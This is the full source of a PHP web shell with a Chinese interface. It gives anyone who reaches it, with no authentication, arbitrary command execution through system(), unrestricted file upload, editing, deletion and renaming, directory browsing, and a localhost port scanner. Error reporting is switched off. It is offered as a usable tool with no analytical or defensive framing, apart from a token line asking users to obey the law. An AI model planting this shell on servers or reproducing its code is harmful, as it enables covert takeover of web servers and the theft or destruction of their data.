<?php
?>
<html>
<head>
<title>
</title>
</head>
<body>
<style type="text/css">
body{
background-color:303030;
color: #666666;
font-family: Verdana;
font-size: 11px;
}
a:link{
color: #33CC99;
}
a:visited{
color: #33CC99;
}
a:hover{
text-decoration: none;
Color: #3399FF;
}
table {
font-size: 11px;
}
</style>
<?php 
error_reporting(0);
set_time_limit(0);
if (empty($_GET['dir'])) {
    $dir = getcwd();
} else {
    $dir = $_GET['dir'];
}
chdir($dir);
$current = htmlentities($_SERVER['PHP_SELF'] . '?dir=' . $dir);
echo '<center><h1>2015专用</h1></center><p><hr><p>
';
echo '<i>服务器: ' . $_SERVER['SERVER_NAME'] . '<br>
';
echo '当前目录: ' . getcwd() . '<br>
';
echo '环境: ' . $_SERVER['SERVER_SOFTWARE'] . '<pre>

</pre></i>
';
echo '
	请使用者注意使用环境并遵守国家相关法律法规！';
echo '<pre>


</pre>';
echo '<table width = 50%>';
echo '<tr>';
echo '<td><a href = \'' . $current . '&mode=system\'>Shell 命令</a></td>
';
echo '<td><a href = \'' . $current . '&mode=create\'>新建文件</a></td>
';
echo '<td><a href = \'' . $current . '&mode=upload\'>上传文件</a></td>
';
echo '<td><a href = \'' . $current . '&mode=port_scan\'>端口扫描</a></td>
';
echo '</tr></table>';
echo '<pre>

</pre>';
$mode = $_GET['mode'];
switch ($mode) {
    case 'edit':
        $file = $_GET['file'];
        $new = $_POST['new'];
        if (empty($new)) {
            $fp = fopen($file, 'r');
            $file_cont = fread($fp, filesize($file));
            $file_cont = str_replace('</textarea>', '<textarea>', $file_cont);
            echo '<form action = \'' . $current . '&mode=edit&file=' . $file . '\' method = \'POST\'>
';
            echo '文件: ' . $file . '<br>
';
            echo '<textarea name = \'new\' rows = \'30%\' cols = \'100%\'>' . $file_cont . '</textarea><br>
';
            echo '<input type = \'submit\' value = \'编辑\'></form>
';
        } else {
            $fp = fopen($file, 'w');
            if (fwrite($fp, $new)) {
                echo $file . ' 编辑。<p>';
            } else {
                echo '无法编辑 ' . $file . '.<p>';
            }
        }
        fclose($fp);
        break;
    case 'delete':
        $file = $_GET['file'];
        if (unlink($file)) {
            echo $file . ' 删除成功。<p>';
        } else {
            echo '无法删除 ' . $file . '.<p>';
        }
        break;
    case 'copy':
        $src = $_GET['src'];
        $dst = $_POST['dst'];
        if (empty($dst)) {
            echo '<form action = \'' . $current . '&mode=copy&src=' . $src . '\' method = \'POST\'>
';
            echo '路径: <input name = \'dst\'><br>
';
            echo '<input type = \'submit\' value = \'副本\'></form>
';
        } else {
            if (copy($src, $dst)) {
                echo '文件复制成功。<p>
';
            } else {
                echo '无法复制 ' . $src . '.<p>
';
            }
        }
        break;
    case 'move':
        $src = $_GET['src'];
        $dst = $_POST['dst'];
        if (empty($dst)) {
            echo '<form action = \'' . $current . '&mode=move&src=' . $src . '\' method = \'POST\'>
';
            echo '路径: <input name = \'dst\'><br>
';
            echo '<input type = \'submit\' value = \'移动\'></form>
';
        } else {
            if (rename($src, $dst)) {
                echo '文件转移成功。<p>
';
            } else {
                echo '无法移动 ' . $src . '.<p>
';
            }
        }
        break;
    case 'rename':
        $old = $_GET['old'];
        $new = $_POST['new'];
        if (empty($new)) {
            echo '<form action = \'' . $current . '&mode=rename&old=' . $old . '\' method = \'POST\'>
';
            echo '新名称: <input name = \'new\'><br>
';
            echo '<input type = \'submit\' value = \'重命名\'></form>
';
        } else {
            if (rename($old, $new)) {
                echo '文件/目录重命名成功。<p>
';
            } else {
                echo '无法重命名 ' . $old . '.<p>
';
            }
        }
        break;
    case 'rmdir':
        $rm = $_GET['rm'];
        if (rmdir($rm)) {
            echo '成功删除目录。<p>
';
        } else {
            echo '无法删除 ' . $rm . '.<p>
';
        }
        break;
    case 'system':
        $cmd = $_POST['cmd'];
        if (empty($cmd)) {
            echo '<form action = \'' . $current . '&mode=system\' method = \'POST\'>
';
            echo 'Shell 命令: <input name = \'cmd\'>
';
            echo '<input type = \'submit\' value = \'运行\'></form><p>
';
        } else {
            system($cmd);
        }
        break;
    case 'create':
        $new = $_POST['new'];
        if (empty($new)) {
            echo '<form action = \'' . $current . '&mode=create\' method = \'POST\'>
';
            echo '<tr><td>新建文件: <input name = \'new\'></td>
';
            echo '<td><input type = \'submit\' value = \'创建\'></td></tr></form>
<p>';
        } else {
            if ($fp = fopen($new, 'w')) {
                echo '文件创建成功。<p>
';
            } else {
                echo '无法创建 ' . $file . '.<p>
';
            }
            fclose($fp);
        }
        break;
    case 'upload':
        $temp = $_FILES['upload_file']['tmp_name'];
        $file = basename($_FILES['upload_file']['name']);
        if (empty($file)) {
            echo '<form action = \'' . $current . '&mode=upload\' method = \'POST\' ENCTYPE=\'multipart/form-data\'>
';
            echo '本地文件: <input type = \'file\' name = \'upload_file\'>
';
            echo '<input type = \'submit\' value = \'上传\'>
';
            echo '</form>
<pre>

</pre>';
        } else {
            if (move_uploaded_file($temp, $file)) {
                echo '文件上传成功。<p>
';
                unlink($temp);
            } else {
                echo '无法上传 ' . $file . '.<p>
';
            }
        }
        break;
    case 'port_scan':
        $port_range = $_POST['port_range'];
        if (empty($port_range)) {
            echo '<table><form action = \'' . $current . '&mode=port_scan\' method = \'POST\'>';
            echo '<tr><td><input type = \'text\' name = \'port_range\'></td><td>';
            echo '输入端口范围要做端口扫描（例：0:65535）</td></tr>';
            echo '<tr><td><input type = \'submit\' value = \'扫描\'></td></tr></form></table>';
        } else {
            $range = explode(':', $port_range);
            if (!is_numeric($range[0]) or !is_numeric($range[1])) {
                echo '错误的参数。<br>';
            } else {
                $host = 'localhost';
                $from = $range[0];
                $to = $range[1];
                echo '开放端口:<br>';
                while ($from <= $to) {
                    $var = 0;
                    $fp = fsockopen($host, $from) or $var = 1;
                    if ($var == 0) {
                        echo $from . '<br>';
                    }
                    $from++;
                    fclose($fp);
                }
            }
        }
        break;
}
clearstatcache();
echo '<pre>

</pre>';
echo '<table width = 100%>
';
$files = scandir($dir);
foreach ($files as $file) {
    if (is_file($file)) {
        $size = round(filesize($file) / 1024, 2);
        echo '<tr><td>' . $file . '</td>';
        echo '<td>' . $size . ' KB</td>';
        echo '<td><a href = ' . $current . '&mode=edit&file=' . $file . '>编辑</a></td>
';
        echo '<td><a href = ' . $current . '&mode=delete&file=' . $file . '>删除</a></td>
';
        echo '<td><a href = ' . $current . '&mode=copy&src=' . $file . '>复制</a></td>
';
        echo '<td><a href = ' . $current . '&mode=move&src=' . $file . '>移动</a></td>
';
        echo '<td><a href = ' . $current . '&mode=rename&old=' . $file . '>重命名</a></td></tr>
';
    } else {
        $items = scandir($file);
        $items_num = count($items) - 2;
        echo '<tr><td>' . $file . '</td>';
        echo '<td>' . $items_num . ' Items</td>';
        echo '<td><a href = ' . $current . '/' . $file . '>打开目录</a></td>
';
        echo '<td><a href = ' . $current . '&mode=rmdir&rm=' . $file . '>删除目录</a></td>
';
        echo '<td><a href = ' . $current . '&mode=rename&old=' . $file . '>重命名目录</a></td></tr>
';
    }
}
echo '</table>
';